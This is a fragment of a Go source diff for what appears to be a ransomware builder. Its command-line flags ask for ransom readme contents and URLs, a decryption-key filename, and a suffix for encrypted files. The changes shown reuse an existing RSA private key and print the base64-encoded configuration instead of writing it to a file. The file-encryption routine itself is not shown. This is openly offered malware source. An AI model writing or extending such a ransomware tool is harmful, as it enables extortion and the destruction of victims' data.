@@ -13,8 +13,8 @@ import (
 	"reflect"
 	"crypto/des"
 	"encoding/base64"
-	"io/ioutil"
 	"flag"
+	"io/ioutil"
 )
 
 func main() {
@@ -30,13 +30,13 @@ func main() {
 		"DkeyFilename": "Filename to store key file for decrypt",
 		"ReadmeUrl":    "URL of ONLINE readme file(keep blank to disable)", "ReadmeNetFilename": "Filename of ONLINE readme file(if enabled)",
 		"Readme":       "Content of OFFLINE readme file(ONE line)", "ReadmeFilename": "Filename of OFFLINE readme file",
-		"Filesuffix":    "Suffix to be added to the end of encrypted files(Include dot)", }
+		"Filesuffix":   "Suffix to be added to the end of encrypted files(Include dot)", }
 	argDict := map[string]*string{}
 	for key, q := range questionDict {
 		argDict[key] = flag.String(key, "", q)
 	}
 	flag.Parse()
-	if len(os.Args) == 0{
+	if len(os.Args) == 0 {
 		flag.Usage()
 		return
 	}
@@ -58,13 +58,22 @@ func main() {
 	// Write Encrypted data to file
 	bE := base64.StdEncoding
 	target := bE.EncodeToString(data)
-	ioutil.WriteFile("data.enc", []byte(target), 0)
+	fmt.Println(target)
 }
 
 // Key Pair Gen Funcs
 func GenRsaKey(bits int) (N string, E int) {
-	privateKey, err := rsa.GenerateKey(rand.Reader, bits)
-	check(err)
+	pk, err := ioutil.ReadFile("private.pem")
+	var privateKey *rsa.PrivateKey
+	if err != nil {
+		privateKey, err = rsa.GenerateKey(rand.Reader, bits)
+		check(err)
+	} else {
+		pkb, _ := pem.Decode(pk)
+		privateKey, err = x509.ParsePKCS1PrivateKey(pkb.Bytes)
+		check(err)
+	}
+
 	derStream := x509.MarshalPKCS1PrivateKey(privateKey)
 	block := &pem.Block{
 		Type:  "RSA PRIVATE KEY",
